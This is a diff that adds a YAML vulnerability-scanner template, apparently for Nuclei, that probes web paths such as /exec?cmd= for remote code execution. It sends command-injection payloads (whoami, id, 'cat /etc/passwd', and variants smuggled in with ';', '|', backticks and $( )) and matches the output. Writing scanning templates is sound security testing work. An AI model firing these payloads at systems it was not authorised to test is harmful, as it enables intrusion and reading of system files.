@@ -1,0 +1,34 @@
+id: rce-basic
+
+info:
+  name: Remote Code Execution
+  author: moriarty
+  severity: critical
+  description: Detects basic RCE vulnerabilities
+  tags: rce,injection
+
+requests:
+  - method: GET
+    path:
+      - "/?cmd={{rce}}"
+      - "/exec?cmd={{rce}}"
+      - "/shell?cmd={{rce}}"
+
+    payloads:
+      rce:
+        - "whoami"
+        - "id"
+        - "cat /etc/passwd"
+        - ";whoami"
+        - "| whoami"
+        - "`whoami`"
+        - "$(whoami)"
+
+    matchers:
+      - type: regex
+        regex:
+          - "uid=[0-9]+\\(.*\\)"
+          - "root:.*:0:0:"
+          - "www-data"
+          - "nobody"
+        condition: or
